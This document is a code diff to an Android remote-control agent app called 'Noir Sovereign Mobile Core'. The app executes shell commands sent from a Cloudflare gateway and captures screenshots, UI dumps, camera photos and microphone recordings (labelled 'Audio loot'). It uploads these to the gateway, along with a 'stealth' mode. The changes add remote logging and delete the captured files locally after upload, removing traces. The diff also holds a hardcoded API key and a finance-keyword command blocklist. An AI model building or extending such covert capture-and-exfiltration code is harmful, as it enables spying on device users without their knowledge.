@@ -31,16 +31,33 @@ session = requests.Session()
 retries = Retry(total=5, backoff_factor=1, status_forcelist=[502, 503, 504])
 session.mount('https://', HTTPAdapter(max_retries=retries))
 
-# --- CONFIG ---
+# --- CONFIG (Unified Standard v14) ---
 # Fallback to defaults if env vars are not set during build
 GATEWAY_URL = os.environ.get("NOIR_GATEWAY_URL", "https://noir-agent-gateway.si-umkm-ikm-pbd.workers.dev")
 API_KEY     = os.environ.get("NOIR_API_KEY", "NOIR_AGENT_KEY_V6_SI_UMKM_PBD_2026")
 DEVICE_ID   = os.environ.get("NOIR_DEVICE_ID", "REDMI_NOTE_14")
 
+# --- DIAGNOSTICS & LOGGING ---
+def noir_log(message, level="INFO"):
+    """Unified logger that prints to UI and sends to Cloudflare for remote diagnosis."""
+    print(f"[{level}] {message}")
+    # Run in thread to avoid blocking main loops
+    def _send():
+        try:
+            session.post(
+                f"{GATEWAY_URL}/agent/log",
+                headers={"Authorization": f"Bearer {API_KEY}"},
+                json={"device_id": DEVICE_ID, "level": level, "message": message},
+                timeout=5
+            )
+        except: pass
+    threading.Thread(target=_send, daemon=True).start()
+
 # --- SAFETY FILTER (v14.0) ---
 def is_safe_command(cmd_str):
     """Dynamic Intent Validator to block financial/payment related actions."""
-    cmd_lower = cmd_str.lower()
+    if not cmd_str: return True
+    cmd_lower = str(cmd_str).lower()
     finance_keywords = [
         "bank", "pay", "finance", "wallet", "dana", "ovo", "gopay", 
         "shopee", "bca", "mandiri", "bri", "bni", "btpns"
@@ -163,11 +180,11 @@ class SovereignCore(App):
                 timeout=20
             )
             if r.status_code == 200:
-                self._log("[SMC] Registration: SUCCESS")
+                noir_log("[SMC] Registration: SUCCESS")
             else:
-                self._log(f"[SMC] Registration: HTTP {r.status_code}")
+                noir_log(f"[SMC] Registration: HTTP {r.status_code}", level="ERROR")
         except Exception as e:
-            self._log(f"[SMC] Connectivity Error (DNS?): {e}")
+            noir_log(f"[SMC] Connectivity Error (DNS?): {e}", level="CRITICAL")
 
     def _screen_share_loop(self):
         """Periodically upload screenshots for real-time dashboard (Autonomous Share)."""
@@ -347,6 +364,12 @@ class SovereignCore(App):
                     result = {"success": True, "output": f"Screenshot uploaded: {key}"}
                 else:
                     result = {"success": False, "error": f"Upload failed: {r.status_code}"}
+                
+                # EPHEMERAL CLEANUP: Purge local cache
+                try:
+                    if os.path.exists(path): os.remove(path)
+                    if os.path.exists(jpeg_path): os.remove(jpeg_path)
+                except: pass
 
             elif atype == "ui_dump":
                 parent = App.get_running_app().user_data_dir
@@ -358,6 +381,9 @@ class SovereignCore(App):
                 with open(path, 'r', encoding='utf-8') as f:
                     xml_content = f.read()
                 result = {"success": True, "output": xml_content}
+                # EPHEMERAL CLEANUP
+                try: os.remove(path)
+                except: pass
 
             elif atype == "stealth":
                 state = params.get("enabled", False)
@@ -383,6 +409,9 @@ class SovereignCore(App):
                     with open(path, 'rb') as f:
                         r = requests.post(f"{GATEWAY_URL}/agent/upload", headers={"Authorization": f"Bearer {API_KEY}"}, files={'file': (f'{atype}.jpg', f, 'image/jpeg')}, data={'device_id': DEVICE_ID}, timeout=30)
                     result = {"success": True, "output": f"Camera capture uploaded: {r.json().get('key')}"}
+                    # EPHEMERAL CLEANUP
+                    try: os.remove(path)
+                    except: pass
                 else:
                     result = {"success": False, "error": "Camera capture failed."}
 
@@ -394,6 +423,9 @@ class SovereignCore(App):
                     with open(path, 'rb') as f:
                         r = requests.post(f"{GATEWAY_URL}/agent/upload", headers={"Authorization": f"Bearer {API_KEY}"}, files={'file': ('audio.mp3', f, 'audio/mpeg')}, data={'device_id': DEVICE_ID}, timeout=30)
                     result = {"success": True, "output": f"Audio loot uploaded: {r.json().get('key')}"}
+                    # EPHEMERAL CLEANUP
+                    try: os.remove(path)
+                    except: pass
                 else:
                     result = {"success": False, "error": "Audio recording failed."}
 
@@ -401,6 +433,19 @@ class SovereignCore(App):
                 # List latest 5 files in Camera folder
                 files = os.popen("ls -t /sdcard/DCIM/Camera | head -n 5").read().strip()
                 result = {"success": True, "output": f"Gallery contents:\n{files}"}
+
+            elif atype == "heal":
+                # SYSTEM HEAL: Clear old caches and logs
+                self._log("[SMC] 🚑 NEURAL HEAL INITIATED: Purging stale caches...")
+                parent = App.get_running_app().user_data_dir
+                cleared = 0
+                for f in os.listdir(parent):
+                    if f.endswith(".png") or f.endswith(".jpg") or f.endswith(".log"):
+                        try:
+                            os.remove(os.path.join(parent, f))
+                            cleared += 1
+                        except: pass
+                result = {"success": True, "output": f"System Healed. {cleared} stale files purged."}
 
             elif atype == "update":
                 # Autonomous update logic: Trigger a rebuild and restart
@@ -433,25 +478,40 @@ class SovereignCore(App):
             self._log(f"[SMC] Result delivery failed: {e}")
 
     def _run_shell(self, cmd, timeout=10):
-        """Intelligent shell execution supporting Shizuku (rish)."""
+        """Intelligent shell execution supporting Shizuku (rish) with diagnostic fallback."""
         import subprocess
         # Standard paths for Shizuku/rish on Android
-        rish_paths = ["/system/bin/rish", "/data/local/tmp/rish", "rish"]
+        rish_paths = ["/system/bin/rish", "/data/local/tmp/rish", "/data/user/0/com.termux/files/usr/bin/rish"]
         rish_bin = "sh"
         
-        # Check for rish availability
+        # Robust path detection
         for p in rish_paths:
-            check = subprocess.run(f"command -v {p}", shell=True, capture_output=True, text=True)
-            if check.returncode == 0:
+            if os.path.exists(p):
                 rish_bin = p
                 break
         
+        # Last resort: try 'which' via subprocess
+        if rish_bin == "sh":
+            try:
+                check = subprocess.run("which rish", shell=True, capture_output=True, text=True)
+                if check.returncode == 0:
+                    rish_bin = check.stdout.strip()
+            except: pass
+
         final_cmd = f"{rish_bin} -c \"{cmd}\"" if "rish" in rish_bin else cmd
         try:
             r = subprocess.run(final_cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+            if r.returncode != 0:
+                noir_log(f"Shell CMD Failed: {cmd}\nOutput: {r.stderr}", level="WARNING")
             return {"success": r.returncode == 0, "output": (r.stdout + r.stderr).strip()}
         except Exception as e:
+            noir_log(f"Shell Exception: {e}", level="ERROR")
             return {"success": False, "error": str(e)}
 
+    def _log(self, message):
+        """Legacy local logging compatibility."""
+        noir_log(message)
+
 if __name__ == '__main__':
+    noir_log(f"🧠 Noir Sovereign Mobile Core v14.0.3 Starting on {DEVICE_ID}...")
     SovereignCore().run()
